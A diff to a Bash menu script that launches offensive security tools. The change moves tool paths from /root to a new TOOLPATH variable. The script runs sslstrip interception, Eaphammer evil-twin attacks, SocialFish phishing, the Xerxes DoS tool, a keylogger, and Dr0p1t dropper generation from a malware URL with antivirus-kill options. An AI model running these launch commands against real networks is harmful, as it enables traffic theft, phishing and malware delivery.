@@ -14,6 +14,9 @@ function defaults_l
 #path for lscript
 	LPATH="/root/lscript"
 	export LPATH
+#path for tools
+	TOOLPATH="/root/tools"
+	export TOOLPATH
 #path for keyboard shortcuts
 	KSPATH=""$LPATH"/ks"
 	export KSPATH
@@ -87,7 +90,7 @@ toolarray=(
 "websploit" "openvas" "shellter" "geany" "bleachbit" "vmr" "hashbuster" "findsploit" "howdoi" "operative" "netattack2" "koadic" "empire" "meterpreter_paranoid_mode"
 "dropit_frmw" "wifi_pumpkin" "veil" "leviathan" "fake_image" "avet" "gloom" "arcanus" "msfpc" "morphhta" "lfi" "unibyav" "demiguise" "dkmc" "sechub" "beef" "mitmf"
 "fsociety" "arp_scan" "netool" "sqlmap" "patator" "zeus" "evil_droid" "nosqlmap" "eggshell" "zerodoor" "cromos" "yuki-chan" "socialfish" "autosploit" "blazy"
-"striker" "hyprpulse" "instaburst" "instagram-py" "datasploit" "sitebroker" "enigma"
+"striker" "hyprpulse" "instaburst" "instagram-py" "datasploit" "sitebroker" "enigma" "pentestingtk" "setoolkit"
 )
 #setting frequent stings
 	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
@@ -586,12 +589,12 @@ function listshortcuts
 	if [[ "$nn" = "1" ]]
 	then
 		TITLE="Fluxion"
-		NAMECD="cd /root/fluxion"
+		NAMECD="cd $TOOLPATH/fluxion"
 		KSSET="./fluxion*"
 	elif [[ "$nn" = "2" ]]
 	then
 		TITLE="Zirikatu"
-		NAMECD="cd /root/zirikatu"
+		NAMECD="cd $TOOLPATH/zirikatu"
 		KSSET="./zirikatu.sh"
 	elif [[ "$nn" = "3" ]]
 	then
@@ -606,17 +609,17 @@ function listshortcuts
 	elif [[ "$nn" = "5" ]]
 	then
 		TITLE="Zatacker"
-		NAMECD="cd /root/Zatacker"
+		NAMECD="cd $TOOLPATH/Zatacker"
 		KSSET="./ZT.sh"
 	elif [[ "$nn" = "6" ]]
 	then
 		TITLE="Morpheus"
-		NAMECD="cd /root/morpheus"
+		NAMECD="cd $TOOLPATH/morpheus"
 		KSSET="./morpheus.sh"
 	elif [[ "$nn" = "7" ]]
 	then
 		TITLE="Hakku"
-		NAMECD="cd /root/hakkuframework"
+		NAMECD="cd $TOOLPATH/hakkuframework"
 		KSSET="./hakku"
 	elif [[ "$nn" = "8" ]]
 	then
@@ -626,12 +629,12 @@ function listshortcuts
 	elif [[ "$nn" = "9" ]]
 	then
 		TITLE="Cupp"
-		NAMECD="cd /root/cupp"
+		NAMECD="cd $TOOLPATH/cupp"
 		KSSET="python cupp.py -i"
 	elif [[ "$nn" = "10" ]]
 	then
 		TITLE="Dracnmap"
-		NAMECD="cd /root/Dracnmap"
+		NAMECD="cd $TOOLPATH/Dracnmap"
 		KSSET="./dracnmap-v*.sh"
 	elif [[ "$nn" = "11" ]]
 	then
@@ -641,7 +644,7 @@ function listshortcuts
 	elif [[ "$nn" = "12" ]]
 	then
 		TITLE="KickThemOut"
-		NAMECD="cd /root/kickthemout"
+		NAMECD="cd $TOOLPATH/kickthemout"
 		KSSET="python kickthemout.py"
 	elif [[ "$nn" = "13" ]]
 	then
@@ -651,7 +654,7 @@ function listshortcuts
 	elif [[ "$nn" = "14" ]]
 	then
 		TITLE="Xerxes"
-		NAMECD="cd /root/xerxes"
+		NAMECD="cd $TOOLPATH/xerxes"
 		KSSET="./xerxes"
 	elif [[ "$nn" = "15" ]]
 	then
@@ -661,7 +664,7 @@ function listshortcuts
 	elif [[ "$nn" = "16" ]]
 	then
 		TITLE="Airgeddon"
-		NAMECD="cd /root/airgeddon"
+		NAMECD="cd $TOOLPATH/airgeddon"
 		KSSET="./airgeddon.sh"
 	elif [[ "$nn" = "17" ]]
 	then
@@ -671,22 +674,22 @@ function listshortcuts
 	elif [[ "$nn" = "18" ]]
 	then
 		TITLE="BeeLogger"
-		NAMECD="cd /root/BeeLogger"
+		NAMECD="cd $TOOLPATH/BeeLogger"
 		KSSET="python bee.py"
 	elif [[ "$nn" = "19" ]]
 	then
 		TITLE="Ezsploit"
-		NAMECD="cd /root/exsploit"
+		NAMECD="cd $TOOLPATH/exsploit"
 		KSSET="./ezsploit.sh"
 	elif [[ "$nn" = "20" ]]
 	then
 		TITLE="Pupy"
-		NAMECD="cd /root/pupy/pupy"
+		NAMECD="cd $TOOLPATH/pupy/pupy"
 		KSSET="./pupysh.py"
 	elif [[ "$nn" = "21" ]]
 	then
 		TITLE="TheFatRat"
-		NAMECD="cd /root/TheFatRat"
+		NAMECD="cd $TOOLPATH/TheFatRat"
 		KSSET="./fatrat"
 	elif [[ "$nn" = "22" ]]
 	then
@@ -706,37 +709,37 @@ function listshortcuts
 	elif [[ "$nn" = "24" ]]
 	then
 		TITLE="RED_HAWK"
-		NAMECD="cd /root/RED_HAWK"
+		NAMECD="cd $TOOLPATH/RED_HAWK"
 		KSSET="php rhawk.php"
 	elif [[ "$nn" = "25" ]]
 	then
 		TITLE="Winpayloads"
-		NAMECD="cd /root/Winpayloads"
+		NAMECD="cd $TOOLPATH/Winpayloads"
 		KSSET="./WinPayloads.py"
 	elif [[ "$nn" = "26" ]]
 	then
 		TITLE="CHAOS"
-		NAMECD="cd /root/CHAOS"
+		NAMECD="cd $TOOLPATH/CHAOS"
 		KSSET="go run CHAOS.go"
 	elif [[ "$nn" = "27" ]]
 	then
 		TITLE="Routersploit"
-		NAMECD="cd /root/routersploit"
+		NAMECD="cd $TOOLPATH/routersploit"
 		KSSET="./rsf.py"
 	elif [[ "$nn" = "28" ]]
 	then
 		TITLE="nWatch"
-		NAMECD="cd /root/nWatch"
+		NAMECD="cd $TOOLPATH/nWatch"
 		KSSET="python nwatch.py"
 	elif [[ "$nn" = "29" ]]
 	then
 		TITLE="Eternal_scanner"
-		NAMECD="cd /root/eternal_scanner"
+		NAMECD="cd $TOOLPATH/eternal_scanner"
 		KSSET="./escan"
 	elif [[ "$nn" = "30" ]]
 	then
 		TITLE="LALIN"
-		NAMECD="cd /root/LALIN"
+		NAMECD="cd $TOOLPATH/LALIN"
 		KSSET="./Lalin.sh"
 	elif [[ "$nn" = "31" ]]
 	then
@@ -746,27 +749,27 @@ function listshortcuts
 	elif [[ "$nn" = "32" ]]
 	then
 		TITLE="Netattack2"
-		NAMECD="cd /root/netattack2"
+		NAMECD="cd $TOOLPATH/netattack2"
 		KSSET="python2 netattack2.py"
 	elif [[ "$nn" = "33" ]]
 	then
 		TITLE="Operative-framework"
-		NAMECD="cd /root/operative-framework"
+		NAMECD="cd $TOOLPATH/operative-framework"
 		KSSET="python operative.py"
 	elif [[ "$nn" = "34" ]]
 	then
 		TITLE="Koadic"
-		NAMECD="cd /root/koadic"
+		NAMECD="cd $TOOLPATH/koadic"
 		KSSET="./koadic"
 	elif [[ "$nn" = "35" ]]
 	then
 		TITLE="Empire"
-		NAMECD="cd /root/Empire"
+		NAMECD="cd $TOOLPATH/Empire"
 		KSSET="./empire"
 	elif [[ "$nn" = "36" ]]
 	then
 		TITLE="Meterpreter_Paranoid_Mode"
-		NAMECD="cd /root/Meterpreter_Paranoid_Mode-SSL"
+		NAMECD="cd $TOOLPATH/Meterpreter_Paranoid_Mode-SSL"
 		KSSET="./Meterpreter_Paranoid_Mode.sh"
 	elif [[ "$nn" = "37" ]]
 	then
@@ -776,32 +779,32 @@ function listshortcuts
 	elif [[ "$nn" = "38" ]]
 	then
 		TITLE="Veil"
-		NAMECD="cd /root/Veil"
+		NAMECD="cd $TOOLPATH/Veil"
 		KSSET="./Veil.py"
 	elif [[ "$nn" = "39" ]]
 	then
 		TITLE="Leviathan"
-		NAMECD="cd /root/leviathan"
+		NAMECD="cd $TOOLPATH/leviathan"
 		KSSET="python leviathan.py"
 	elif [[ "$nn" = "40" ]]
 	then
 		TITLE="Gloom-Framework"
-		NAMECD="cd /root/Gloom-Framework"
+		NAMECD="cd $TOOLPATH/Gloom-Framework"
 		KSSET="python gloom.py"
 	elif [[ "$nn" = "41" ]]
 	then
 		TITLE="Arcanus"
-		NAMECD="cd /root/ARCANUS"
+		NAMECD="cd $TOOLPATH/ARCANUS"
 		KSSET="./ARCANUS"
 	elif [[ "$nn" = "42" ]]
 	then
 		TITLE="LFISuite"
-		NAMECD="cd /root/LFISuite"
+		NAMECD="cd $TOOLPATH/LFISuite"
 		KSSET="python lfisuite.py"
 	elif [[ "$nn" = "43" ]]
 	then
 		TITLE="DKMC"
-		NAMECD="cd /root/DKMC"
+		NAMECD="cd $TOOLPATH/DKMC"
 		KSSET="python dkmc.py"
 	elif [[ "$nn" = "44" ]]
 	then
@@ -816,42 +819,42 @@ function listshortcuts
 	elif [[ "$nn" = "46" ]]
 	then
 		TITLE="Evil-Droid"
-		NAMECD="cd /root/Evil-Droid"
+		NAMECD="cd $TOOLPATH/Evil-Droid"
 		KSSET="./evil-droid"
 	elif [[ "$nn" = "47" ]]
 	then
 		TITLE="NoSQLMap"
-		NAMECD="cd /root/NoSQLMap"
+		NAMECD="cd $TOOLPATH/NoSQLMap"
 		KSSET="python nosqlmap.py"
 	elif [[ "$nn" = "48" ]]
 	then
 		TITLE="EggShell"
-		NAMECD="cd /root/EggShell"
+		NAMECD="cd $TOOLPATH/EggShell"
 		KSSET="python eggshell.py"
 	elif [[ "$nn" = "49" ]]
 	then
 		TITLE="Zerodoor"
-		NAMECD="cd /root/Zerodoor"
+		NAMECD="cd $TOOLPATH/Zerodoor"
 		KSSET="python zerodoor.py"
 	elif [[ "$nn" = "50" ]]
 	then
 		TITLE="AutoSploit"
-		NAMECD="cd /root/AutoSploit"
+		NAMECD="cd $TOOLPATH/AutoSploit"
 		KSSET="python autosploit.py"
 	elif [[ "$nn" = "51" ]]
 	then
 		TITLE="Enigma"
-		NAMECD="cd /root/Enigma"
+		NAMECD="cd $TOOLPATH/Enigma"
 		KSSET="python enigma.py"
 	elif [[ "$nn" = "52" ]]
 	then
 		TITLE="SocialFish"
-		NAMECD="cd /root/SocialFish"
+		NAMECD="cd $TOOLPATH/SocialFish"
 		KSSET="python SocialFish.py"
 	elif [[ "$nn" = "53" ]]
 	then
 		TITLE="Yuki-Chan-The-Auto-Pentest"
-		NAMECD="cd /root/Yuki-Chan-The-Auto-Pentest"
+		NAMECD="cd $TOOLPATH/Yuki-Chan-The-Auto-Pentest"
 		KSSET="./yuki.sh"
 	fi
 }
@@ -1618,7 +1621,7 @@ then
 		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
 		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
 		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
-		sslstrip -l $PORTTCP -w /root/sslstrip.log
+		sslstrip -l $PORTTCP -w $TOOLPATH/sslstrip.log
 		echo -e "$PAKTGB"
 		$READAK
 		continue
@@ -1649,13 +1652,13 @@ then
 		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
 		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
 		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
-		sslstrip -l $PORTTCP -w /root/sslstrip.log
+		sslstrip -l $PORTTCP -w $TOOLPATH/sslstrip.log
 		echo -e "$PAKTGB"
 		$READAK
 		continue
 	elif [[ "$MITMCH" = "4" ]]
 	then
-		leafpad /root/sslstrip.log
+		leafpad $TOOLPATH/sslstrip.log
 	#~ elif [[ "$MITMCH" = "44" ]]
 	#~ then
 	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
@@ -1841,7 +1844,7 @@ do
 	echo -e "-----------------Basic options-----------------"
 	echo -e ""$YS" 1"$CE") Specify your hash(es)        CURRENT:$HASH"
 	echo -e ""$YS" 2"$CE") Crack/verify                 CURRENT:$CORV"
-	if [[ -f /root/lscript/hashlog.txt ]]
+	if [[ -f $TOOLPATH/lscript/hashlog.txt ]]
 	then
 		echo -e ""$YS" 3"$CE") View your last log"
 	else
@@ -1896,7 +1899,7 @@ do
 		fi
 	elif [[ "$DAGON" = "update" ]]
 	then
-		cd /root/dagon
+		cd $TOOLPATH/dagon
 		python dagon.py --update
 		sleep 3
 	elif [[ "$DAGON" = "start" ]]
@@ -1912,7 +1915,7 @@ do
 			sleep 5
 			continue
 		fi
-		cd /root/dagon
+		cd $TOOLPATH/dagon
 		if [[ "$HASHTYPE" = 1 ]]
 		then
 			if [[ "$CORV" = "crack" ]]
@@ -2015,12 +2018,12 @@ do
 		fi
 	elif [[ "$DAGON" = 3 ]]
 	then
-		if [[ ! -f /root/lscript/hashlog.txt ]]
+		if [[ ! -f $TOOLPATH/lscript/hashlog.txt ]]
 		then
 			echo -e ""$RS"No log found."$CE""
 			sleep 2
 		else
-			cat /root/lscript/hashlog.txt
+			cat $TOOLPATH/lscript/hashlog.txt
 			echo -e "$PAKTGB"
 			$READAK
 		fi
@@ -2239,7 +2242,7 @@ EOF
 		sleep 3
 		continue
 	else
-		cd /root/patator
+		cd $TOOLPATH/patator
 		export XTP
 		xterm -T "INSTRUCTIONS" -hold -e "echo -e "---------------------------------------" && echo -e 'start with: python patator.py $XPT' && echo -e "---------------------------------------" && python patator.py $XPT" & disown
 		xterm -T "PATATOR" -hold & disown
@@ -2368,7 +2371,7 @@ function eaphammer_automation
 				clear
 				if [[ "$EAPH" = 1 ]]
 				then
-					cd /root/eaphammer
+					cd $TOOLPATH/eaphammer
 					./eaphammer --cert-wizard
 				elif [[ "$EAPH" = 2 ]]
 				then
@@ -2564,7 +2567,7 @@ function eaphammer_automation
 				BSSID="-b $EAPHBSSID"
 				WPA="--wpa $EAPHWPA"
 				AUTH="--auth $EAPHAUTH"
-					cd /root/eaphammer
+					cd $TOOLPATH/eaphammer
 					./eaphammer $IFACE $CHANNEL $BSSID $ESSID $WPA $AUTH $PIVOT $KARMA $INTAUTO $CAPTIVE $HOSTILE $CREDS $AIRCRACK $WORD
 					
 				fi
@@ -2683,12 +2686,12 @@ do
 	clear
 	if [[ "$DR" = "o" ]]
 	then
-		gio open /root/Dr0p1t-Framework/output
+		gio open $TOOLPATH/Dr0p1t-Framework/output
 		continue
 	fi
 	if [[ "$DR" = "u" ]]
 	then
-		cd /root/Dr0p1t-Framework
+		cd $TOOLPATH/Dr0p1t-Framework
 		python Dr0p1t.py -u
 		cd
 		continue
@@ -2809,7 +2812,7 @@ do
 		else
 			DBANN="-q"
 		fi
-		cd /root/Dr0p1t-Framework
+		cd $TOOLPATH/Dr0p1t-Framework
 		python Dr0p1t.py $MALURL $DSTARTUP $DTASK $DLTPUP $DKILLANT $DRUNBAT $DRUNPOW $DRUNVBS $DUACASADMIN $DSPOOFEXT $DISZIP $DCOMPRESS $DDISUAC $DICON $DEVENT $DCOMPILE $DD32 $DD64 $DBANN
 		echo -e "$PAKTGB"
 		$READAK
@@ -2824,9 +2827,9 @@ do
 		then
 			while true
 			do
-				echo -e ""$RS"Icon must be on /root/Dr0p1t-Framework/icons folder."$CE""
+				echo -e ""$RS"Icon must be on $TOOLPATH/Dr0p1t-Framework/icons folder."$CE""
 				echo -e ""
-				ls -1 /root/Dr0p1t-Framework/icons/
+				ls -1 $TOOLPATH/Dr0p1t-Framework/icons/
 				echo -e ""
 				echo -e ""$YS"cp"$CE") Copy my icon to that folder"
 				echo -e ""$YS" b"$CE") Go back"
@@ -2846,11 +2849,11 @@ do
 						echo -e ""$RS"File does not exist."$CE""
 						sleep 2
 					else
-						cp "$FP" /root/Dr0p1t-Framework/icons/
+						cp "$FP" $TOOLPATH/Dr0p1t-Framework/icons/
 					fi
-				elif [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON" ]]
+				elif [[ ! -f $TOOLPATH/Dr0p1t-Framework/icons/"$ICON" ]]
 				then
-					if [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON".ico ]]
+					if [[ ! -f $TOOLPATH/Dr0p1t-Framework/icons/"$ICON".ico ]]
 					then
 						echo -e ""$RS"File not found."$CE""
 						sleep 2
@@ -2871,9 +2874,9 @@ do
 		then
 			while true
 			do
-				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/vbs folder."$CE""
+				echo -e ""$RS"Script must be on $TOOLPATH/Dr0p1t-Framework/scripts/vbs folder."$CE""
 				echo -e ""
-				ls -1 /root/Dr0p1t-Framework/scripts/vbs/
+				ls -1 $TOOLPATH/Dr0p1t-Framework/scripts/vbs/
 				echo -e ""
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
@@ -2893,11 +2896,11 @@ do
 						echo -e ""$RS"File does not exist."$CE""
 						sleep 2
 					else
-						cp "$FP" /root/Dr0p1t-Framework/scripts/vbs/
+						cp "$FP" $TOOLPATH/Dr0p1t-Framework/scripts/vbs/
 					fi
-				elif [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS" ]]
+				elif [[ ! -f $TOOLPATH/Dr0p1t-Framework/scripts/vbs/"$RUNVBS" ]]
 				then
-					if [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS".vbs ]]
+					if [[ ! -f $TOOLPATH/Dr0p1t-Framework/scripts/vbs/"$RUNVBS".vbs ]]
 					then
 						echo -e ""$RS"File not found."$CE""
 						sleep 2
@@ -2918,9 +2921,9 @@ do
 		then
 			while true
 			do
-				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/powershell folder."$CE""
+				echo -e ""$RS"Script must be on $TOOLPATH/Dr0p1t-Framework/scripts/powershell folder."$CE""
 				echo -e ""
-				ls -1 /root/Dr0p1t-Framework/scripts/powershell/
+				ls -1 $TOOLPATH/Dr0p1t-Framework/scripts/powershell/
 				echo -e ""
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
@@ -2940,11 +2943,11 @@ do
 						echo -e ""$RS"File does not exist."$CE""
 						sleep 2
 					else
-						cp "$FP" /root/Dr0p1t-Framework/scripts/powershell/
+						cp "$FP" $TOOLPATH/Dr0p1t-Framework/scripts/powershell/
 					fi
-				elif [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW" ]]
+				elif [[ ! -f $TOOLPATH/Dr0p1t-Framework/scripts/powershell/"$RUNPOW" ]]
 				then
-					if [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW".ps1 ]]
+					if [[ ! -f $TOOLPATH/Dr0p1t-Framework/scripts/powershell/"$RUNPOW".ps1 ]]
 					then
 						echo -e ""$RS"File not found."$CE""
 						sleep 2
@@ -2965,9 +2968,9 @@ do
 		then
 			while true
 			do
-				echo -e ""$RS"Script must be on /root/Dr0p1t-Framework/scripts/bat folder."$CE""
+				echo -e ""$RS"Script must be on $TOOLPATH/Dr0p1t-Framework/scripts/bat folder."$CE""
 				echo -e ""
-				ls -1 /root/Dr0p1t-Framework/scripts/bat/
+				ls -1 $TOOLPATH/Dr0p1t-Framework/scripts/bat/
 				echo -e ""
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
@@ -2987,11 +2990,11 @@ do
 						echo -e ""$RS"File does not exist."$CE""
 						sleep 2
 					else
-						cp "$FP" /root/Dr0p1t-Framework/scripts/bat/
+						cp "$FP" $TOOLPATH/Dr0p1t-Framework/scripts/bat/
 					fi
-				elif [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT" ]]
+				elif [[ ! -f $TOOLPATH/Dr0p1t-Framework/scripts/bat/"$RUNBAT" ]]
 				then
-					if [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT".bat ]]
+					if [[ ! -f $TOOLPATH/Dr0p1t-Framework/scripts/bat/"$RUNBAT".bat ]]
 					then
 						echo -e ""$RS"File not found."$CE""
 						sleep 2
@@ -3130,7 +3133,7 @@ function wifi_tools
 	clear
 	TERMINALTITLE="WIFI TOOLS"
 	dash_calc
-	if [[ -d /root/fluxion ]]
+	if [[ -d $TOOLPATH/fluxion ]]
 	then
 		echo -e ""$YS" 1"$CE") Fluxion               The future of MITM WPA attacks"
 	else
@@ -3142,49 +3145,49 @@ function wifi_tools
 	else
 		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"               Automated wireless attack tool"
 	fi
-	if [[ -d /root/wifiphisher ]]
+	if [[ -d $TOOLPATH/wifiphisher ]]
 	then
 		echo -e ""$YS" 3"$CE") Wifiphisher           Automated phishing attacks against Wi-Fi clients"
 	else
 		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"           Automated phishing attacks against Wi-Fi clients"
 	fi
-	if [[ -d /root/Zatacker ]]
+	if [[ -d $TOOLPATH/Zatacker ]]
 	then
 		echo -e ""$YS" 4"$CE") Zatacker              MITM-NMAP-Mail Spammer..(Install it manually)"
 	else
 		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"              MITM-NMAP-Mail Spammer..(Install it manually)"
 	fi
-	if [[ -d /root/morpheus ]]
+	if [[ -d $TOOLPATH/morpheus ]]
 	then
 		echo -e ""$YS" 5"$CE") Morpheus              Automated Ettercap TCP/IP Hijacking Tool"
 	else
 		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"              Automated Ettercap TCP/IP Hijacking Tool"
 	fi
-	#~ if [[ -d /root/osrframework ]]
+	#~ if [[ -d $TOOLPATH/osrframework ]]
 	#~ then
 		#~ echo -e ""$YS" 6"$CE") Osrfconsole           Checks usernames-phones to platforms etc.."
 	#~ else
 		#~ echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"           Checks usernames-phones to platforms etc.."
 	#~ fi
-	if [[ -d /root/opensource ]]
+	if [[ -d $TOOLPATH/netool-toolkit ]]
 	then
 		echo -e ""$YS" 6"$CE") Netool-toolkit        MitM pentesting opensource toolkit"
 	else
 		echo -e ""$RS" 6"$CE") "$RS"Netool-toolkit"$CE"        MitM pentesting opensource toolkit"
 	fi
-	if [[ -d /root/hakkuframework ]]
+	if [[ -d $TOOLPATH/hakkuframework ]]
 	then
 		echo -e ""$YS" 7"$CE") Hakku                 Penetration testing tools"
 	else
 		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"                 Penetration testing tools"
 	fi
-	if [[ -d /root/Trity ]]
+	if [[ -d $TOOLPATH/Trity ]]
 	then
 		echo -e ""$YS" 8"$CE") Trity                 Advanced pentesting framework"
 	else
 		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"                 Advanced pentesting framework"
 	fi
-	if [[ -d /root/Dracnmap ]]
+	if [[ -d $TOOLPATH/Dracnmap ]]
 	then				
 		echo -e ""$YS" 9"$CE") Dracnmap              Many scan options"
 	else
@@ -3202,7 +3205,7 @@ function wifi_tools
 	else
 		echo -e ""$RS"11"$CE") "$RS"Netdiscover"$CE"           Network address discovering tool"
 	fi
-	if [[ -d /root/kickthemout ]]
+	if [[ -d $TOOLPATH/kickthemout ]]
 	then	
 		echo -e ""$YS"12"$CE") KickThemOut           Kick devices off your network"
 	else
@@ -3214,25 +3217,25 @@ function wifi_tools
 	else
 		echo -e ""$RS"13"$CE") "$RS"Ghost-Phisher"$CE"         Fake AP,MITM,Session hijacking etc..."
 	fi
-	if [[ -d /root/The-Eye ]]
+	if [[ -d $TOOLPATH/The-Eye ]]
 	then	
 		echo -e ""$YS"14"$CE") The Eye               Detects ARP poisoning DNS spoofing etc..."
 	else
 		echo -e ""$RS"14"$CE") "$RS"The Eye"$CE"               Detects ARP poisoning DNS spoofing etc..."
 	fi
-	if [[ -d /root/xerxes ]]
+	if [[ -d $TOOLPATH/xerxes ]]
 	then	
 		echo -e ""$YS"15"$CE") Xerxes                The most powerful DoS tool(CAUTION)"
 	else
 		echo -e ""$RS"15"$CE") "$RS"Xerxes"$CE"                The most powerful DoS tool(CAUTION)"
 	fi
-	if [[ -d /root/KatanaFramework ]]
+	if [[ -d $TOOLPATH/KatanaFramework ]]
 	then
 		echo -e ""$YS"16"$CE") Katana Framework      Many penetration testing features"
 	else
 		echo -e ""$RS"16"$CE") "$RS"Katana Framework"$CE"      Many penetration testing features"
 	fi
-	if [[ -d /root/airgeddon ]]
+	if [[ -d $TOOLPATH/airgeddon ]]
 	then
 		echo -e ""$YS"17"$CE") Airgeddon             Audit wireless networks."
 	else
@@ -3256,37 +3259,37 @@ function wifi_tools
 	else
 		echo -e ""$RS"20"$CE") "$RS"Angry IP Scanner"$CE"      IP Scanner"
 	fi
-	if [[ -d /root/routersploit ]]
+	if [[ -d $TOOLPATH/routersploit ]]
 	then
 		echo -e ""$YS"21"$CE") Routersploit          Find/exploit router vulnerabilities"
 	else
 		echo -e ""$RS"21"$CE") "$RS"Routersploit"$CE"          Find/exploit router vulnerabilities"
 	fi
-	if [[ -d /root/nWatch ]]
+	if [[ -d $TOOLPATH/nWatch ]]
 	then
 		echo -e ""$YS"22"$CE") nWatch                IP scanner/OS detection"
 	else
 		echo -e ""$RS"22"$CE") "$RS"nWatch"$CE"                IP scanner/OS detection"
 	fi
-	if [[ -d /root/eternal_scanner ]]
+	if [[ -d $TOOLPATH/eternal_scanner ]]
 	then
 		echo -e ""$YS"23"$CE") Eternal scanner       Scans hosts for eternalblue vulnerabilities"
 	else
 		echo -e ""$RS"23"$CE") "$RS"Eternal scanner"$CE"       Scans hosts for eternalblue vulnerabilities"
 	fi
-	if [[ -d /root/eaphammer ]]
+	if [[ -d $TOOLPATH/eaphammer ]]
 	then
 		echo -e ""$YS"24"$CE") Eaphammer             Evil twin attacks against WPA2-Enterprise networks"
 	else
 		echo -e ""$RS"24"$CE") "$RS"Eaphammer"$CE"             Evil twin attacks against WPA2-Enterprise networks"
 	fi
-	if [[ -d /root/VMR ]]
+	if [[ -d $TOOLPATH/VMR ]]
 	then
 		echo -e ""$YS"25"$CE") VMR                   Best WPS cracker, mdk3-v6"
 	else
 		echo -e ""$RS"25"$CE") "$RS"VMR"$CE"                   Best WPS cracker, mdk3-v6"
 	fi
-	if [[ -d /root/netattack2 ]]
+	if [[ -d $TOOLPATH/netattack2 ]]
 	then
 		echo -e ""$YS"26"$CE") Netattack3            Advanced network scan and attack script"
 	else
@@ -3298,7 +3301,7 @@ function wifi_tools
 	else
 		echo -e ""$RS"27"$CE") "$RS"Wifi-Pumpkin"$CE"          Framework for Rogue Wi-Fi Access Point Attack"
 	fi
-	if [[ -d /root/Gloom-Framework ]]
+	if [[ -d $TOOLPATH/Gloom-Framework ]]
 	then
 		echo -e ""$YS"28"$CE") Gloom                 Penetration Testing Framework"
 	else
@@ -3310,7 +3313,7 @@ function wifi_tools
 	else
 		echo -e ""$RS"29"$CE") "$RS"secHub"$CE"                Security/Hacking Kit"
 	fi
-	if [[ -d /root/SocialFish ]]
+	if [[ -d $TOOLPATH/SocialFish ]]
 	then
 		echo -e ""$YS"30"$CE") SocialFish            Ultimate phishing tool with Ngrok integrated"
 	else
@@ -3324,13 +3327,13 @@ function wifi_tools
 	clear
 	if [[ "$APPP" = "1" ]]
 	then
-		if [[ -d /root/fluxion ]]
+		if [[ -d $TOOLPATH/fluxion ]]
 		then
-			cd /root/fluxion
-			#~ if [[ -f /root/fluxion/fluxion ]]
+			cd $TOOLPATH/fluxion
+			#~ if [[ -f $TOOLPATH/fluxion/fluxion ]]
 			#~ then
 				./fluxion*
-			#~ elif [[ -f /root/fluxion/fluxion.sh ]]
+			#~ elif [[ -f $TOOLPATH/fluxion/fluxion.sh ]]
 			#~ then
 				#~ ./fluxion.sh
 			#~ fi
@@ -3362,7 +3365,7 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "3" ]]
 	then
-		if [[ -d /root/wifiphisher ]]
+		if [[ -d $TOOLPATH/wifiphisher ]]
 		then
 			clear
 			wifiphisher
@@ -3378,11 +3381,11 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "4" ]]
 	then
-		if [[ -d /root/Zatacker ]]
+		if [[ -d $TOOLPATH/Zatacker ]]
 		then
-			if [[ -d "/root/Zatacker" ]]
+			if [[ -d "$TOOLPATH/Zatacker" ]]
 			then	
-				cd /root/Zatacker
+				cd $TOOLPATH/Zatacker
 				./ZT.sh
 				cd
 			else
@@ -3402,9 +3405,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "5" ]]
 	then
-		if [[ -d /root/morpheus ]]
+		if [[ -d $TOOLPATH/morpheus ]]
 		then
-			cd /root/morpheus
+			cd $TOOLPATH/morpheus
 			./morpheus.sh
 			cd
 		else
@@ -3419,9 +3422,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "6" ]]
 	then
-		if [[ -d "/root/opensource" ]]
+		if [[ -d "$TOOLPATH/opensource" ]]
 		then
-			cd /root/opensource
+			cd $TOOLPATH/opensource
 			./netool.sh
 		else
 			echo -e "$TNI"
@@ -3435,12 +3438,12 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "7" ]]
 	then
-		if [[ -d /root/hakkuframework ]]
+		if [[ -d $TOOLPATH/hakkuframework ]]
 		then
 			echo -e "type: 'show modules' to start"
 			sleep 2
 			clear
-			cd /root/hakkuframework
+			cd $TOOLPATH/hakkuframework
 			./hakku
 			cd
 		else
@@ -3455,7 +3458,7 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "8" ]]
 	then
-		if [[ -d /root/Trity ]]
+		if [[ -d $TOOLPATH/Trity ]]
 		then
 			echo -e "type: 'help' to start"
 			sleep 2
@@ -3473,9 +3476,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "9" ]]
 	then
-		if [[ -d "/root/Dracnmap" ]]
+		if [[ -d "$TOOLPATH/Dracnmap" ]]
 		then
-			cd /root/Dracnmap/
+			cd $TOOLPATH/Dracnmap/
 			./dracnmap-v*.sh	
 			cd		
 		else
@@ -3492,7 +3495,7 @@ function wifi_tools
 	then
